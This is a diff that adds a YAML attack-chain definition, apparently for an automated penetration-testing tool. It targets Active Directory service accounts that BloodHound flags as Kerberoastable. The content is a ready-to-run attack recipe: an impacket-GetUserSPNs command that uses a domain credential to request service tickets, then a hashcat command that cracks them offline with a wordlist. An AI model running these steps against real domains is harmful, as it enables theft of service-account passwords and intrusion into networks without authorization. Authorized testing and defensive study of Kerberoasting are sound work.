@@ -1,0 +1,27 @@
+chain_id: bloodhound_kerberoast_targeted
+title: "AD — targeted Kerberoast against SPN-bound accounts BloodHound flagged"
+severity: HIGH
+tags: [ad, kerberos, kerberoast, bloodhound, targeted]
+
+trigger:
+  any_of:
+    - { kind: "ad-kerberoastable-target" }
+
+description: |
+  BloodHound identified one or more SPN-bound accounts (HasSPN). With a
+  single valid domain credential, request service tickets specifically
+  for those accounts. Service accounts often carry weaker, human-set
+  passwords than user accounts — Kerberoast is one of the highest-yield
+  AD attacks.
+
+steps:
+  - id: 1
+    title: "Request TGS tickets for the targeted users"
+    command: impacket-GetUserSPNs $DOMAIN/USUARIO:'PASSWORD' -dc-ip $DC -request -outputfile tgs.hash
+
+  - id: 2
+    title: "Crack offline (fires kerberos_kerberoast on the result)"
+    command: hashcat -m 13100 -a 0 tgs.hash /usr/share/wordlists/rockyou.txt
+
+references:
+  - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast
